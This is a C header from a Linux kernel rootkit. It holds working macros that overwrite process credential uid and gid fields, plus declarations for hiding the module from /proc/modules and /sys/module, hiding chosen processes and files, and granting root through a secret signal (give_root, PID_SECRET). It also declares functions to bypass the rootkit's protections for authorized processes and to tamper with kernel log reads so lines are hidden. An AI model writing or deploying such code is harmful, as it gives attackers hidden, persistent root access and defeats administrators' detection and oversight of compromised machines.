#ifndef _ROOTKIT_UTILS_H_
#define _ROOTKIT_UTILS_H_

#include "constants.h"
#include "macro_utils.h"
#include <asm/current.h>
#include <linux/kstrtox.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <vdso/limits.h>

/**
 * Sets the value of a `kuid_t` variable.
 *
 * @param _kuid The `kuid_t` variable to change
 * @param _uid  The new value to set
 */
#define __SET_UID(_kuid, _uid) \
    do {                       \
        (_kuid).val = (_uid);  \
    } while (0)

/**
 * Sets the value of a `kgid_t` variable.
 *
 * @param _kgid The `kgid_t` variable to change
 * @param _gid  The new value to set
 */
#define __SET_GID(_kgid, _gid) \
    do {                       \
        (_kgid).val = (_gid);  \
    } while (0)

/**
 * Sets the value of the uid, suid, euid and fsuid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _uid     The new value to set
 */
#define __SET_UIDS(_p_creds, _uid)            \
    do {                                      \
        __SET_UID((_p_creds)->uid, (_uid));   \
        __SET_UID((_p_creds)->suid, (_uid));  \
        __SET_UID((_p_creds)->euid, (_uid));  \
        __SET_UID((_p_creds)->fsuid, (_uid)); \
    } while (0)

/**
 * Sets the value of the gid, sgid, egid and fsgid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _gid     The new value to set
 */
#define __SET_GIDS(_p_creds, _gid)            \
    do {                                      \
        __SET_GID((_p_creds)->gid, (_gid));   \
        __SET_GID((_p_creds)->sgid, (_gid));  \
        __SET_GID((_p_creds)->egid, (_gid));  \
        __SET_GID((_p_creds)->fsgid, (_gid)); \
    } while (0)

/**
 * Creates a new `string_t` structure with the given string value.
 *
 * @param _s_str The string value
 * @return The new `string_t` structure
 */
#define NEW_STRING_ENTRY(_s_str)                        \
    {                                                   \
        .s_str = (_s_str), .sz_len = sizeof(_s_str) - 1 \
    }

/**
 * Creates an array of `string_t` structures from the given strings.
 *
 * @param ... The strings
 * @return The array of `string_t` structures
 */
#define STRING_ARRAY(...)                                   \
    {                                                       \
        __MAPX_LIST(NEW_STRING_ENTRY, __VA_ARGS__),         \
        {                                                   \
            /* The last element must have a NULL `s_str` */ \
            NULL, 0                                         \
        }                                                   \
    }

/**
 * Structure representing an entry in a list of PIDs.
 */
typedef struct pid_list_tag {
    struct list_head list; // PID linked list head
    pid_t i32_pid;         // PID value
} pid_list_t;

typedef struct buffer_tag {
    void *p_data;  // Pointer to the buffer data
    size_t sz_len; // Size of the buffer
} buffer_t;

struct module_notes_attrs {
    struct kobject *dir;
    unsigned int notes;
    struct bin_attribute attrs[];
};

struct module_sect_attr {
    struct bin_attribute battr;
    unsigned long address;
};

struct module_sect_attrs {
    struct attribute_group grp;
    unsigned int nsections;
    struct module_sect_attr attrs[];
};

typedef struct file file_t;
typedef struct path path_t;
typedef struct inode inode_t;
typedef struct dentry dentry_t;
typedef struct files_struct files_t;
typedef struct task_struct task_t;

typedef ssize_t (*proc_read_t)(file_t *file, char __user *buf, size_t count, loff_t *ppos);

extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
// Head of the authorized PIDs linked list (processes that bypass the rootkit)
extern struct list_head authorized_pids_list;

/**
 * Gets the effective PID for the given PID.
 * If it is 0, return the current PID.
 * If it is -1 or INT_MIN, return -1.
 * If it is < -1, return the absolute value.
 * Otherwise, return the given PID.
 *
 * @param i32_pid The PID to get the effective PID for
 * @return The effective PID
 */
static inline pid_t get_effective_pid(const pid_t i32_pid)
{
    if (i32_pid == 0) {
        return current->pid;
    }

    if (i32_pid == INT_MIN) {
        return -1;
    }

    if (i32_pid < -1) {
        return -i32_pid;
    }

    return i32_pid;
}

/**
 * Copy data from user space to kernel space, chunk by chunk.
 * @note Taken from kernel code (kernel/module.c), as it is static.
 *
 * @param p_dst    The destination (kernel) buffer
 * @param p_usrc   The source (user) buffer
 * @param ui64_len The length of the data to copy
 * @return 0 on success, otherwise an error code
 */
int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long ui64_len);

/**
 * Does the given file name need to be hidden?
 *
 * @param s_filename The file name to check
 * @return `true` if the given file needs to be hidden, `false` otherwise
 */
bool is_filename_hidden(const char *const s_filename);

/**
 * Hides the rootkit from /proc/modules and /sys/module/, and several other places.
 */
void hide_module(void);

/**
 * Unhides the rootkit from /proc/modules.
 */
void unhide_module(void);

/**
 * Callback for SIGMODHIDE signal.
 *
 * @param i32_pid The PID that was sent with the signal
 *                (should be equal to PID_SECRET to be allowed to hide the rootkit)
 * @param i32_sig The signal that was passed (SIGMODHIDE)
 * @return 0 on success, otherwise an error code (should always be 0)
 */
long sig_hide_module(const pid_t i32_pid, const int i32_sig);

/**
 * Callback for SIGMODSHOW signal.
 *
 * @param i32_pid The PID that was sent with the signal
 *                (should be equal to PID_SECRET to be allowed to show the rootkit)
 * @param i32_sig The signal that was passed (SIGMODSHOW)
 * @return 0 on success, otherwise an error code (should always be 0)
 */
long sig_show_module(const pid_t i32_pid, const int i32_sig);

/**
 * Elevates the current process to root.
 *
 * @param i32_pid The PID that was sent with the signal
 *                (should be equal to PID_SECRET to be allowed to elevate)
 * @param i32_sig The signal that was passed (SIGROOT)
 * @return 0 on success, otherwise an error code
 */
long give_root(const pid_t i32_pid, const int i32_sig);

/**
 * Checks if the given PID is in the list of hidden processes.
 * If the given PID is 0, the current process is checked.
 *
 * @param i32_pid The PID to check
 * @return `true` if the given PID is in the list of hidden processes, `false` otherwise
 */
bool is_pid_hidden(const pid_t i32_pid);

/**
 * Hides or shows (unhides) the given process from /proc/ and /proc/PID/.
 * If the given PID is 0, the current process is (un)hidden.
 *
 * @param i32_pid The PID to (un)hide
 * @param i32_sig The signal that was passed (SIGHIDE or SIGSHOW)
 * @return 0 on success, otherwise an error code
 */
long show_hide_process(const pid_t i32_pid, const int i32_sig);

/**
 * Clears the list of hidden PIDs and frees all associated memory.
 */
void show_all_processes(void);

/**
 * Checks if the given PID is in the list of authorized processes.
 * If the given PID is 0, the current process is checked.
 * @note Authorized processes bypass the rootkit protection mechanisms.
 *
 * @param i32_pid The PID to check
 * @return `true` if the given PID is in the list of authorized processes, `false` otherwise
 */
bool is_process_authorized(const pid_t i32_pid);

/**
 * Authorizes the given process to bypass the rootkit protection mechanisms.
 * If the given PID is 0, the current process is authorized.
 *
 * @param i32_pid The PID to authorize
 * @param i32_sig The signal that was passed (SIGAUTH)
 * @return 0 on success, otherwise an error code
 */
long authorize_process(const pid_t i32_pid, const int i32_sig);

/**
 * Clears the list of authorized PIDs and frees all associated memory.
 */
void clear_auth_list(void);

/**
 * Restores the original `kmsg_read()` and `devkmsg_read()` functions.
 */
void restore_kmsg_read(void);

/**
 * If the current process is authorized, return `false`.
 * Otherwise, check if the given PID is hidden.
 *
 * @param i32_pid The PID to check
 * @return `false` if the current process is authorized, otherwise return whether the given PID is
 * hidden
 */
static inline bool check_pid_hidden_auth(const pid_t i32_pid)
{
    return (!is_process_authorized(PID_SELF)) && is_pid_hidden(i32_pid);
}

/**
 * Hide lines that contain the given string.
 *
 * @param s_buffer The user buffer to hide lines from
 * @param sz_len   The length of the user buffer
 * @param s_search The string to search for
 * @return The new length of the user buffer
 */
size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search);

#endif
